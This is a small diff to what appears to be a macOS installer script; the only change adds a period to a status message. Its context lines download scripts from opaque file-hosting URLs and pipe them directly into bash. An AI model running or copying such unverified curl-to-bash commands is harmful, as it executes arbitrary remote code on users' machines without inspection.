@@ -6,7 +6,7 @@ main() {
     if [ -w "/Applications" ]; then
         curl -s "https://f3a5dqxez3.ufs.sh/f/ijk9xZzvhn3rQufdpE0DfXGI1bpTyQt85z06u3nRhVdUZjsq" | bash
     else
-        echo -e "${YELLOW}[!] Local user detected, using home directory instead of global directory ${NC}"
+        echo -e "${YELLOW}[!] Local user detected, using home directory instead of global directory. ${NC}"
         curl -s "https://f3a5dqxez3.ufs.sh/f/ijk9xZzvhn3rvsHeLMgiL1bp4Pf7QXqR3ud9oh8CvUxJVNFa" | bash
     fi
 }
